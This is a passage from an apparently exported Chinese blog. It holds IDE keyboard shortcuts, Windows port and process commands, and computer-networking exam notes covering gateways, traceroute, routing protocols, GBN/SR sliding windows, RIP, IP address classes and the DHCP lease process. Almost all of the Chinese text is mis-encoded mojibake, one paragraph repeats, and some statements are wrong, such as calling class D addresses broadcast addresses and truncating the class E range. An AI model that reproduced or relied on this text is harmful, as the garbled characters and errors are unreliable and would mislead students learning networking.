<p>æµè§ˆå™¨å…³é—­å½“å‰æ´»åŠ¨çª—å£: ctrl + w</p>
<h3 id="idea-1"><a href="#idea-1" class="headerlink" title="idea"></a>idea</h3><table>
<thead>
<tr>
<th align="center">å¿«æ·é”®</th>
<th align="center">ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Ctrl + Y</td>
<td align="center">åˆ é™¤ä¸€è¡Œ</td>
</tr>
<tr>
<td align="center">Ctrl + D</td>
<td align="center">å¤åˆ¶ä¸€è¡Œ</td>
</tr>
<tr>
<td align="center">Ctrl + Alt + L</td>
<td align="center">æ ¼å¼åŒ–</td>
</tr>
<tr>
<td align="center">Ctrl + Alt + O</td>
<td align="center">å¯¼åŒ…</td>
</tr>
<tr>
<td align="center">Alt+Insertï¼ˆå¯ä¿®æ”¹ï¼‰</td>
<td align="center">Newèœå•\ä»£ç ç”Ÿæˆèœå•ï¼ˆç”Ÿæˆgetterå’Œsetterï¼Œmavenä¾èµ–ç­‰ï¼‰</td>
</tr>
<tr>
<td align="center">Ctrl + &#x2F;</td>
<td align="center">æ³¨é‡Š</td>
</tr>
<tr>
<td align="center">Ctrl + Shift + &#x2F;</td>
<td align="center">å¤šè¡Œæ³¨é‡Š</td>
</tr>
<tr>
<td align="center">Ctrl + Alt + å·¦&#x2F;å³</td>
<td align="center">å›é€€åˆ°ä¸Šä¸€æ¬¡æ“ä½œçš„åœ°æ–¹ï¼Œç­‰äºeclipseä¸­çš„ Alt+å·¦&#x2F;å³</td>
</tr>
<tr>
<td align="center">Shift + Alt + ä¸Š&#x2F;ä¸‹</td>
<td align="center">å°†ä»£ç ä¸Šç§»æˆ–ä¸‹ç§»ä¸€è¡Œ</td>
</tr>
</tbody></table>
<p>Ctrl + H ï¼šç½—åˆ—ç±»çš„ç»§æ‰¿å…³ç³»</p>
<p>è¿æŒ‰ä¸¤æ¬¡shiftï¼Œå…¨å±€æœç´¢</p>
<h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><p>æŸ¥çœ‹ç«¯å£: netstat -ano</p>
<p>æŸ¥çœ‹å…·ä½“ç«¯å£å ç”¨æƒ…å†µ: netstat -aon|findstr â€œ49157â€</p>
<p>æŸ¥è¿›ç¨‹åç§°: tasklist |findstr â€œè¿›ç¨‹idå·â€</p>
<p>æŸ¥çœ‹ä¼šè¯: netstat -n</p>
<p>æŸ¥çœ‹æœåŠ¡: msconfig</p>
<p>æ€è¿›ç¨‹: tskill pid</p>
<p>æ€è¿›ç¨‹: taskkill &#x2F;f &#x2F;t &#x2F;im â€œè¿›ç¨‹idæˆ–è€…è¿›ç¨‹åç§°â€</p>
]]></content>
      <categories>
        <category>å¸¸ç”¨å‘½ä»¤</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>centos</tag>
        <tag>docker</tag>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¡ç®—æœºç½‘ç»œçœŸé¢˜</title>
    <url>/2021/09/21/%E8%80%83%E7%A0%94/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9C%9F%E9%A2%98/</url>
    <content><![CDATA[<h1 id="è®¡ç®—æœºç½‘ç»œçœŸé¢˜"><a href="#è®¡ç®—æœºç½‘ç»œçœŸé¢˜" class="headerlink" title="è®¡ç®—æœºç½‘ç»œçœŸé¢˜"></a>è®¡ç®—æœºç½‘ç»œçœŸé¢˜</h1><p>ç±»æ¯”å‘é‚®ä»¶, </p>
<p>ä¸€ä¸ªå°åŒºä¸€ä¸ªipåœ°å€ï¼Œå¤šä¸ªå°åŒºæ„æˆä¸€ä¸ªåŸå¸‚</p>
<p>æ¯ä¸ªåŸå¸‚æœ‰ä¸€ä¸ªè·¯ç”±å™¨ã€‚è·¯ç”±å™¨æœ‰å¤šä¸ªæ¥å£ï¼Œä¸€ä¸ªå£èƒ½é€šå¾€ä¸€ä¸ªåŸå¸‚ï¼Œæ¯ä¸ªæ¥å£çš„åœ°å€å°±æ˜¯ç½‘å…³çš„åœ°å€ã€‚</p>
<p>ç½‘å…³æ˜¯ä½ æ‰€åœ¨çš„ç½‘ç»œçš„ä¸€ä¸ªè·¯ç”±å™¨ï¼Œå°±å¦‚åŒä¸€ä¸ªçœ‹é—¨çš„ï¼ŒæŠŠå±äºè¯¥å­ç½‘çš„æ¶ˆæ¯åŒ…æ¥æ”¶è¿‡æ¥ï¼Œä¸å±äºçš„å°±è¿‡æ»¤æ‰ã€‚</p>
<p>è·¯ç”±å™¨ä¹Ÿæœ‰ç¼“å­˜ï¼Œä¸­å¤®å¤„ç†å•å…ƒï¼Œå†…åµŒå¼æ“åšç³»ç»Ÿï¼Œå†…å­˜ç­‰ç­‰</p>
<p>ç½‘å…³åœ°å€å°±æ˜¯åˆ†é…ç»™è·¯ç”±å™¨å¯¹åº”æ¥å£çš„IPåœ°å€ã€‚å¯¹äºç½‘å…³æ¥è¯´ï¼Œåªè¦æ˜¯é™¤äº†ç½‘ç»œåœ°å€ï¼ˆä¸»æœºå·å…¨0ï¼‰ï¼Œå¹¿æ’­åœ°å€ï¼ˆä¸»æœºå·å…¨1ï¼‰ä»¥å¤–çš„å¯ç”¨ä¸»æœºåœ°å€éƒ½å¯ä»¥åˆ†é…ç»™å®ƒã€‚æ¯”æ–¹è¯´ï¼Œåœ¨192.168.1.0&#x2F;24 çš„ç½‘ç»œé‡Œé¢ï¼Œç½‘ç»œåœ°å€æ˜¯192.168.1.0 å¹¿æ’­åœ°å€æ˜¯192.168.1.255ï¼Œé‚£ä¹ˆé™¤äº†ä»¥ä¸Šä¸¤ä¸ªåœ°å€ä»¥å¤–çš„192.168.1.1-192.168.1.254 éƒ½æ˜¯å¯ä»¥åˆ†é…ç»™ç½‘å…³çš„</p>
<p>ä¸¾ä¾‹è¯´æ˜ï¼šIPæ˜¯192.168.154.128 ï¼Œå­ç½‘æ©ç æ˜¯24ä½çš„ï¼Œé‚£ä¹ˆç½‘ç»œå·å°±æ˜¯192.168.154.0ï¼Œæˆ‘åœ¨ç»™ä»–æŒ‡å®šä¸€ä¸ªç½‘å…³æ˜¯192.168.154.2 ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘çš„è¿™å°ç”µè„‘æƒ³è¦å’ŒåŒç½‘çš„192.168.154.129é€šä¿¡ï¼Œé‚£ä¹ˆä»–å°±ä¸ç”¨ç½‘å…³äº†ï¼Œç›´æ¥å‘åˆ°å±€åŸŸç½‘ä¸Šå°±å¯ä»¥äº†ã€‚ä½†æ˜¯å¦‚æœæˆ‘æƒ³è¦å‘ç»™è¿œç¨‹çš„ä¸»æœºï¼Œæ¯”æ–¹è¯´IPæ˜¯192.168.2.1 åŒæ ·24ä½çš„ï¼Œå®ƒçš„ç½‘ç»œå·å°±æ˜¯192.168.2.0 è¿™æ—¶ç½‘å…³å°±èµ·ä½œç”¨äº†ï¼Œæˆ‘çš„ç”µè„‘å°±ä¼šæŠŠæ•°æ®å‘ç»™ç½‘å…³ï¼Œç”±ç½‘å…³å†è½¬å‘ä¸€ç›´åˆ°è¾¾ç›®çš„åœ°ä¹Ÿå°±æ˜¯IP æ˜¯192.168.2.1çš„ä¸»æœºä¸Šã€‚</p>
<p>121.35.102.11</p>
<p>100.64.57.168</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448070.jpg" alt="img"></p>
<p>tracerouteç¨‹åºå®Œæ•´è¿‡ç¨‹ï¼šé¦–å…ˆå®ƒå‘é€ä¸€ä»½TTLå­—æ®µä¸º1çš„IPæ•°æ®åŒ…ç»™ç›®çš„ä¸»æœºï¼Œå¤„ç†è¿™ä¸ªæ•°æ®åŒ…çš„ç¬¬ä¸€ä¸ªè·¯ç”±å™¨å°†TTLå€¼å‡1ï¼Œç„¶åä¸¢å¼ƒè¯¥æ•°æ®æŠ¥ï¼Œå¹¶ç»™æºä¸»æœºå‘é€ä¸€ä¸ªICMPæŠ¥æ–‡ï¼ˆâ€œè¶…æ—¶â€ä¿¡æ¯ï¼Œè¿™ä¸ªæŠ¥æ–‡åŒ…å«äº†è·¯ç”±å™¨çš„IPåœ°å€ï¼Œè¿™æ ·å°±å¾—åˆ°äº†ç¬¬ä¸€ä¸ªè·¯ç”±å™¨çš„åœ°å€ï¼‰ï¼Œç„¶åtracerouteå‘é€ä¸€ä¸ªTTLä¸º2çš„æ•°æ®æŠ¥æ¥å¾—åˆ°ç¬¬äºŒä¸ªè·¯ç”±å™¨çš„IPåœ°å€ï¼Œç»§ç»­è¿™ä¸ªè¿‡ç¨‹ï¼Œç›´è‡³è¿™ä¸ªæ•°æ®æŠ¥åˆ°è¾¾ç›®çš„ä¸»æœºã€‚</p>
<p>è®¡ç®—æœºç½‘ç»œä¸­çš„è‡ªæ²»ç³»ç»Ÿæ˜¯æŒ‡èƒ½å¤Ÿè‡ªä¸»å†³å®šåœ¨æœ¬ç³»ç»Ÿä¸­åº”é‡‡å–æŸç§è·¯ç”±åè®®çš„å•ä½ã€‚</p>
<p>å†…éƒ¨ç½‘å…³åè®® IGP (Interior Gateway Protocol)  å³åœ¨ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿå†…éƒ¨ä½¿ç”¨çš„è·¯ç”±é€‰æ‹©åè®®ã€‚ç›®å‰è¿™ç±»è·¯ç”±é€‰æ‹©åè®®ä½¿ç”¨å¾—æœ€å¤šï¼Œå¦‚ RIP å’Œ OSPF åè®®ã€‚</p>
<p>å¤–éƒ¨ç½‘å…³åè®®EGP (External Gateway Protocol)  è‹¥æºç«™å’Œç›®çš„ç«™å¤„åœ¨ä¸åŒçš„è‡ªæ²»ç³»ç»Ÿä¸­ï¼Œå½“æ•°æ®æŠ¥ä¼ åˆ°ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿçš„è¾¹ç•Œæ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨ä¸€ç§åè®®å°†è·¯ç”±é€‰æ‹©ä¿¡æ¯ä¼ é€’åˆ°å¦ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿä¸­ã€‚è¿™æ ·çš„åè®®å°±æ˜¯å¤–éƒ¨ç½‘å…³åè®® EGPã€‚åœ¨å¤–éƒ¨ç½‘å…³åè®®ä¸­ç›®å‰ä½¿ç”¨æœ€å¤šçš„æ˜¯ BGP-4ã€‚ </p>
<p>å¤–éƒ¨ç½‘å…³åè®®EGP (External Gateway Protocol)  è‹¥æºç«™å’Œç›®çš„ç«™å¤„åœ¨ä¸åŒçš„è‡ªæ²»ç³»ç»Ÿä¸­ï¼Œå½“æ•°æ®æŠ¥ä¼ åˆ°ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿçš„è¾¹ç•Œæ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨ä¸€ç§åè®®å°†è·¯ç”±é€‰æ‹©ä¿¡æ¯ä¼ é€’åˆ°å¦ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿä¸­ã€‚è¿™æ ·çš„åè®®å°±æ˜¯å¤–éƒ¨ç½‘å…³åè®® EGPã€‚åœ¨å¤–éƒ¨ç½‘å…³åè®®ä¸­ç›®å‰ä½¿ç”¨æœ€å¤šçš„æ˜¯ BGP-4ã€‚ </p>
<h1 id="ç‰©ç†å±‚"><a href="#ç‰©ç†å±‚" class="headerlink" title="ç‰©ç†å±‚"></a>ç‰©ç†å±‚</h1><p>WAN ï¼Œ Wide Area Network å¹¿åŸŸç½‘</p>
<p>å¹¿åŸŸç½‘ä¼ æ’­èŒƒå›´å¹¿ï¼Œä¸€èˆ¬ç”¨äºä¸–ç•Œçš„å›½å®¶ã€åœ°åŒºä¹‹é—´çš„ç½‘ç»œè¿æ¥ï¼Œä¸€èˆ¬èŒƒå›´ä¸ºå‡ ååˆ°å‡ åƒå…¬é‡Œä¸ç­‰ã€‚è¿œè·ç¦»ä¼ è¾“ï¼Œéœ€è¦é«˜é€Ÿé“¾è·¯ã€‚</p>
<p>MAN ï¼ŒMetroplitan Area Network åŸåŸŸç½‘</p>
<p>åŸåŸŸç½‘ä¸€èˆ¬ç”¨äºåŸé™…ä¿¡æ¯çš„ä¼ è¾“ï¼Œä¸€èˆ¬ä½¿ç”¨çš„æŠ€æœ¯ä¸ºä»¥å¤ªç½‘ï¼Œä¼ è¾“èŒƒå›´ä¸º5~50kmã€‚</p>
<p>LAN ï¼Œ Local Area Network å±€åŸŸç½‘</p>
<p>å±€åŸŸç½‘çš„ä½œç”¨èŒƒå›´ä¸€èˆ¬å°±æ˜¯1kmå·¦å³ï¼Œå…¬å¸ã€å­¦æ ¡ä¸€èˆ¬éƒ½æœ‰å¤šä¸ªå±€åŸŸç½‘ï¼ˆä¼ä¸šç½‘&#x2F;æ ¡å›­ç½‘ï¼‰ã€‚</p>
<p>PAN ï¼ŒPersonal Area Network ä¸ªäººå±€åŸŸç½‘</p>
<p>ä¸€èˆ¬ä½¿ç”¨æ— çº¿æŠ€æœ¯ï¼Œå› æ­¤ä¹Ÿå¸¸è¢«ç§°ä¸ºWPANã€‚æˆ‘ä»¬æ‰‹æœºéƒ½æœ‰å…±äº«WIFIï¼Œå…±äº«çƒ­ç‚¹çš„åŠŸèƒ½ï¼Œè¿™äº›åŠŸèƒ½å°±æ˜¯ä½¿ç”¨PANæŠ€æœ¯ã€‚</p>
<ul>
<li>å…¬ç”¨ç½‘ç»œï¼šç”µä¿¡è¿è¥å•†å‡ºèµ„å»ºé€ çš„å¤§å‹ç½‘ç»œã€‚æ¥å…¥éœ€è¦ä¸€å®šè´¹ç”¨ã€‚ï¼ˆç®€ç§°å¤–ç½‘ï¼‰</li>
<li>ä¸“ç”¨ç½‘ç»œï¼šå•ä½å†…éƒ¨å»ºé€ çš„ç½‘ç»œã€‚è¿™ç§ç½‘ç»œä¸å‘æœ¬å•ä½ä»¥å¤–çš„å…¬ä¼—å¼€æ”¾ã€‚ï¼ˆç®€ç§°å†…ç½‘ï¼‰</li>
</ul>
<p>å‘é€æ—¶å»¶æ…¢ï¼Œä¼ æ’­æ—¶å»¶å¿«</p>
<h1 id="æ•°æ®é“¾è·¯å±‚"><a href="#æ•°æ®é“¾è·¯å±‚" class="headerlink" title="æ•°æ®é“¾è·¯å±‚"></a>æ•°æ®é“¾è·¯å±‚</h1><p>ï¼ˆ2009ç»Ÿè€ƒçœŸé¢˜35ï¼‰æ•°æ®é“¾è·¯å±‚é‡‡ç”¨åé€€ N å¸§(GBN)åè®®ï¼Œå‘é€æ–¹å·²ç»å‘é€äº†ç¼–å·ä¸º 0~7 çš„ å¸§ã€‚å½“è®¡æ—¶å™¨è¶…æ—¶æ—¶ï¼Œè‹¥å‘é€æ–¹åªæ”¶åˆ° 0ã€2ã€3 å·å¸§çš„ç¡®è®¤ï¼Œåˆ™å‘é€æ–¹éœ€è¦é‡å‘çš„å¸§æ•°æ˜¯______________________________ ã€‚</p>
<p>A.2   B.3   C.4   D.5</p>
<p>ç­”æ¡ˆï¼šC</p>
<p>è§£æï¼šåœ¨GBNåè®®ä¸­ï¼Œä¸¢å¤±ä¸€ä¸ªåé¢å…¨æŠ›å¼ƒã€‚è¿ç»­ARQé‡‡ç”¨ç´¯è®¡ç¡®è®¤çš„æ–¹å¼ã€‚</p>
<h1 id="ç½‘ç»œå±‚"><a href="#ç½‘ç»œå±‚" class="headerlink" title="ç½‘ç»œå±‚"></a>ç½‘ç»œå±‚</h1><p>ç½‘ç»œå±‚å‘ä¸Šåªæä¾›ç®€å•çµæ´»çš„ï¼Œæ— è¿æ¥ï¼Œå°½æœ€å¤§åŠªåŠ›äº¤äº’çš„æ•°æ®æŠ¥æœåŠ¡ã€‚</p>
<h2 id="è™šç”µè·¯å’Œç”µè·¯äº¤æ¢"><a href="#è™šç”µè·¯å’Œç”µè·¯äº¤æ¢" class="headerlink" title="è™šç”µè·¯å’Œç”µè·¯äº¤æ¢"></a>è™šç”µè·¯å’Œç”µè·¯äº¤æ¢</h2><p>ç”µè·¯äº¤æ¢ï¼šé€šå¸¸æ˜¯åœ¨ç‰©ç†å±‚ï¼Œè­¬å¦‚æ‰“ç”µè¯ç­‰ã€‚æ­¤æ—¶æ•´ä¸ªç‰©ç†çº¿è·¯çš„å¸¦å®½æ˜¯ç”±è¯¥é€šè®¯ç‹¬å çš„ã€‚</p>
<p>è™šç”µè·¯äº¤æ¢ï¼šåœ¨ä¸€æ¡ç‰©ç†çº¿è·¯ä¸Šè™šæ‹Ÿå‡ºå¤šä¸ªé€»è¾‘çš„é€šé“ï¼Œæ­¤æ—¶è¯¥ç‰©ç†çº¿è·¯ä¸Šå¯ä»¥æœ‰å¤šæ¡é€šè®¯é‡ï¼Œæ¯æ¡é€šè®¯ç‹¬å ä¸€æ¡è™šæ‹Ÿç”µè·¯ã€‚å¤šä¸ªè™šæ‹Ÿç”µè·¯é€šè¿‡æ—¶åˆ†&#x2F;é¢‘åˆ†ç­‰å¤šè·¯å¤ç”¨æ–¹å¼å¤ç”¨åˆ°ä¸€æ¡ç‰©ç†é“¾è·¯ä¸Šã€‚</p>
<p>IPåœ°å€åˆ†ç±»ï¼š</p>
<p>1.0.0.0   åˆ° 126.255.255.255ä¸ºAç±»  ä¸»è¦åˆ†é…ç»™å…·æœ‰å¤§é‡ä¸»æœºè€Œå±€åŸŸç½‘ç»œæ•°é‡è¾ƒå°‘çš„å¤§å‹ç½‘ç»œ<br>128.0.0.0 åˆ° 191.255.255.255ä¸ºBç±»  ä¸€èˆ¬ç”¨äºå›½é™…æ€§å¤§å…¬å¸å’Œæ”¿åºœæœºæ„<br>192.0.0.0 åˆ° 223.255.255.255ä¸ºCç±»  ç”¨äºä¸€èˆ¬å°å…¬å¸ æ ¡å›­ç½‘ ç ”ç©¶æœºæ„ç­‰<br>224.0.0.0 åˆ° 239.255.255.255ä¸ºDç±»  ç”¨äºç‰¹æ®Šç”¨é€”. åˆç§°åšå¹¿æ’­åœ°å€<br>240.0.0.0 åˆ° 247.255.255.255ä¸ºEç±». æš‚æ—¶ä¿ç•™ </p>
<p>ï¼ˆ2010ç»Ÿè€ƒçœŸé¢˜ï¼‰æŸè‡ªæ²»ç³»ç»Ÿå†…é‡‡ç”¨ RIP åè®®ï¼Œè‹¥è¯¥è‡ªæ²»ç³»ç»Ÿå†…çš„è·¯ç”±å™¨ R1 æ”¶åˆ°å…¶é‚»å±…è·¯ç”±å™¨ R2 çš„è·ç¦»çŸ¢é‡ï¼Œ</p>
<p>è·ç¦»çŸ¢é‡ä¸­åŒ…å«ä¿¡æ¯&lt;net1,16&gt;ï¼Œåˆ™èƒ½å¾—å‡ºçš„ç»“</p>
<p>è®ºæ˜¯____________________________ ã€‚</p>
<p>A.R2 å¯ä»¥ç»è¿‡ R1 åˆ°è¾¾ net1ï¼Œè·³æ•°ä¸º 17 </p>
<p>B.R2 å¯ä»¥åˆ°è¾¾ net1ï¼Œè·³æ•°ä¸º 16</p>
<p>C.R1 å¯ä»¥ç»è¿‡ R2 åˆ°è¾¾ net1ï¼Œè·³æ•°ä¸º 17 </p>
<p>D.R1 ä¸èƒ½ç»è¿‡ R2 åˆ°è¾¾ net1</p>
<p>ç­”æ¡ˆï¼šD</p>
<p>è§£æï¼šè€ƒæŸ¥ RIP è·¯ç”±åè®®ã€‚R1 åœ¨æ”¶åˆ°ä¿¡æ¯å¹¶æ›´æ–°è·¯ç”±è¡¨åï¼Œè‹¥éœ€è¦ç»è¿‡ R2 åˆ°è¾¾ net1ï¼Œåˆ™å…¶è·³æ•°ä¸º 17ï¼Œç”±äºè·ç¦»ä¸º 16 è¡¨ç¤ºä¸å¯è¾¾ï¼Œå› æ­¤ R1 ä¸èƒ½ç»è¿‡ R2 åˆ°è¾¾ net1ï¼ŒR2 ä¹Ÿ ä¸å¯èƒ½åˆ°è¾¾ net1ã€‚Bã€C é”™è¯¯ï¼ŒD æ­£ç¡®ã€‚è€Œé¢˜ç›®ä¸­å¹¶æœªç»™å‡º R1 å‘ R2 å‘é€ çš„ä¿¡æ¯ï¼Œå› æ­¤ A ä¹Ÿä¸æ­£ç¡®ã€‚</p>
<h1 id="ä¼ è¾“å±‚"><a href="#ä¼ è¾“å±‚" class="headerlink" title="ä¼ è¾“å±‚"></a>ä¼ è¾“å±‚</h1><h1 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h1><h1 id="å†å¹´çœŸé¢˜"><a href="#å†å¹´çœŸé¢˜" class="headerlink" title="å†å¹´çœŸé¢˜"></a>å†å¹´çœŸé¢˜</h1><h2 id="2020"><a href="#2020" class="headerlink" title="2020"></a>2020</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448072.png" alt="æˆªå±2021-08-14 ä¸‹åˆ6.51.50"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448073.png" alt="æˆªå±2021-08-14 ä¸‹åˆ6.51.58"></p>
<p>NAT ï¼šnetwork address translation</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448074.png" alt="æˆªå±2021-08-14 ä¸‹åˆ6.52.15"></p>
<h2 id="2019"><a href="#2019" class="headerlink" title="2019"></a>2019</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448075.png" alt="image-20211023102126888"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448076.png" alt="image-20211023102141272"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448077.png" alt="image-20211023102801041"></p>
<h2 id="2018"><a href="#2018" class="headerlink" title="2018"></a>2018</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448078.png" alt="image-20211023103213188"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448079.png" alt="image-20211023103226104"></p>
<p>0      111 1101 </p>
<p>1      1111101</p>
<p>MTUï¼šMaximum Transmission Unit</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448080.png" alt="image-20211023103252056"></p>
<p>0 - 775</p>
<p>776 - 1480</p>
<h2 id="2017"><a href="#2017" class="headerlink" title="2017"></a>2017</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448081.png" alt="image-20211023104056006"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448082.png" alt="image-20211023104135653"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448083.png" alt="image-20211023104155315"></p>
<p>åœç­‰åè®®åªéœ€è¦ä¸€ä¸ªbitç»™å¸§ç¼–å·</p>
<p>ä¸ºä»€ä¹ˆGBNåè®®çš„åºå·ä¸ªæ•°è¦å¤§äºç­‰äºå‘é€çª—å£+1ï¼Ÿ</p>
<p>1&lt;&#x3D; Wt &lt;&#x3D; 2^n - 1</p>
<p>0 1 2 3 0 1 2 3</p>
<p>å¦‚æœæ˜¯4</p>
<p>4ä¸ªå…¨å‘å‡ºå»ï¼Œ4ä¸ªackéƒ½ä¸¢äº†ï¼Œä¹‹åå‘é€å‘é€æ–¹é‡ä¼ ï¼Œæ¥æ”¶æ–¹æ— æ³•è¯†åˆ«æ˜¯æ–°çš„è¿˜æ˜¯æ—§çš„ã€‚æ¥æ”¶æ–¹æ¥å—çª—å£æ˜¯1</p>
<p>SRåè®®</p>
<p>è‹¥é‡‡ç”¨nä¸ªæ¯”ç‰¹å¯¹å¸§ç¼–å·ï¼Œåˆ™å…¶å‘é€çª—å£çš„å°ºå¯¸åº”æ»¡è¶³ï¼š1~2^(n-1)^</p>
<p>ã€‚è‹¥å‘é€çª—å£çš„å°ºå¯¸å¤§äº2^(n-1)ï¼Œåˆ™ä¼šé€ æˆæ¥å—æ–¹æ— æ³•åˆ†è¾¨æ–°å¸§å’Œæ—§å¸§ã€‚</p>
<h2 id="2016"><a href="#2016" class="headerlink" title="2016"></a>2016</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448084.png" alt="image-20211023140015900"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448085.png" alt="image-20211023140036936"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448086.png" alt="image-20211023140102549"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448087.png" alt="image-20211023140125531"></p>
<p>æ…¢å¼€å§‹ç®—æ³•æ¯æ¬¡æ”¶åˆ°ä¸€ä¸ªå¯¹æ–°æŠ¥æ–‡æ®µçš„ç¡®è®¤å°±ä½¿å‘é€æ–¹çš„æ‹¥å¡çª—å£åŠ 1</p>
<h2 id="2015"><a href="#2015" class="headerlink" title="2015"></a>2015</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448088.png" alt="image-20211023142922439"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448089.png" alt="image-20211023142934609"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448090.png" alt="image-20211023142956645"></p>
<p>ARPï¼šAddress Resolution Protocol</p>
<p>DHCPï¼šDynamic Host Configuration Protocol</p>
<p>DHCPç§Ÿçº¦è¿‡ç¨‹å°±æ˜¯DHCPå®¢æˆ·æœºåŠ¨æ€è·å–IPåœ°å€çš„è¿‡ç¨‹ã€‚</p>
<p><a href="https://blog.51cto.com/yuanbin/109574">https://blog.51cto.com/yuanbin/109574</a></p>
<p>DHCPç§Ÿçº¦è¿‡ç¨‹åˆ†ä¸º4æ­¥ï¼š</p>
<ul>
<li><p>å®¢æˆ·æœºè¯·æ±‚IPï¼ˆå®¢æˆ·æœºå‘DHCPDISCOVERå¹¿æ’­åŒ…ï¼‰</p>
<p>å½“ä¸€ä¸ªDHCPå®¢æˆ·æœºå¯åŠ¨æ—¶ï¼Œä¼šè‡ªåŠ¨å°†è‡ªå·±çš„IPåœ°å€é…ç½®æˆ0.0.0.0ï¼Œç”±äºä½¿ç”¨0.0.0.0ä¸èƒ½è¿›è¡Œæ­£å¸¸é€šä¿¡ï¼Œæ‰€ä»¥å®¢æˆ·æœºå°±å¿…é¡»é€šè¿‡DHCPæœåŠ¡å™¨æ¥è·å–ä¸€ä¸ªåˆæ³•çš„åœ°å€ã€‚ç”±äºå®¢æˆ·æœºä¸çŸ¥é“DHCPæœåŠ¡å™¨çš„IPåœ°å€ï¼Œæ‰€ä»¥å®ƒä½¿ç”¨0.0.0.0çš„åœ°å€ä½œä¸ºæºåœ°å€ï¼Œä½¿ç”¨UDP68ç«¯å£ä½œä¸ºæºç«¯å£ï¼Œä½¿ç”¨255.255.255.255ä½œä¸ºç›®æ ‡åœ°å€ï¼Œä½¿ç”¨UDP67ç«¯å£ä½œä¸ºç›®çš„ç«¯å£æ¥å¹¿æ’­è¯·æ±‚IPåœ°å€ä¿¡æ¯ã€‚å¹¿æ’­ä¿¡æ¯ä¸­åŒ…å«äº†DHCPå®¢æˆ·æœºçš„MACåœ°å€å’Œè®¡ç®—æœºåï¼Œä»¥ä¾¿ä½¿DHCPæœåŠ¡å™¨èƒ½ç¡®å®šæ˜¯å“ªä¸ªå®¢æˆ·æœºå‘é€çš„è¯·æ±‚ã€‚</p>
</li>
<li><p>æœåŠ¡å™¨å“åº”ï¼ˆæœåŠ¡å™¨å‘DHCPOFFERå¹¿æ’­åŒ…ï¼‰ï¼›</p>
<p>å½“DHCPæœåŠ¡å™¨æ¥æ”¶åˆ°å®¢æˆ·æœºè¯·æ±‚IPåœ°å€çš„ä¿¡æ¯æ—¶ï¼Œå®ƒå°±åœ¨è‡ªå·±çš„IPåœ°å€æ± ä¸­æŸ¥æ‰¾æ˜¯å¦æœ‰åˆæ³•çš„IPåœ°å€æä¾›ç»™å®¢æˆ·æœºã€‚å¦‚æœæœ‰ï¼ŒDHCPæœåŠ¡å™¨å°±å°†æ­¤IPåœ°å€åšä¸Šæ ‡è®°ï¼ŒåŠ å…¥åˆ°DHCPOFFERçš„æ¶ˆæ¯ä¸­ï¼Œç„¶åDHCPæœåŠ¡å™¨å°±å¹¿æ’­ä¸€åˆ™åŒ…æ‹¬ä¸‹åˆ—ä¿¡æ¯çš„DHCPOFFERæ¶ˆæ¯ï¼š</p>
<p>DHCPå®¢æˆ·æœºçš„MACåœ°å€ï¼›DHCPæœåŠ¡å™¨æä¾›çš„åˆæ³•IPåœ°å€ï¼›å­ç½‘æ©ç ï¼›é»˜è®¤ç½‘å…³ï¼ˆè·¯ç”±ï¼‰ï¼›ç§Ÿçº¦çš„æœŸé™ï¼›DHCPæœåŠ¡å™¨çš„IPåœ°å€ã€‚</p>
<p> å› ä¸ºDHCPå®¢æˆ·æœºè¿˜æ²¡æœ‰IPåœ°å€ï¼Œæ‰€ä»¥DHCPæœåŠ¡å™¨ä½¿ç”¨è‡ªå·±çš„IPåœ°å€ä½œä¸ºæºåœ°å€ï¼Œä½¿ç”¨UDP67ç«¯å£ä½œä¸ºæºç«¯å£ï¼Œä½¿ç”¨255.255.255.255ä½œä¸ºç›®æ ‡åœ°å€ï¼Œä½¿ç”¨UDP68ç«¯å£ä½œä¸ºç›®çš„ç«¯å£æ¥å¹¿æ’­DHCPOFFERä¿¡æ¯ã€‚</p>
</li>
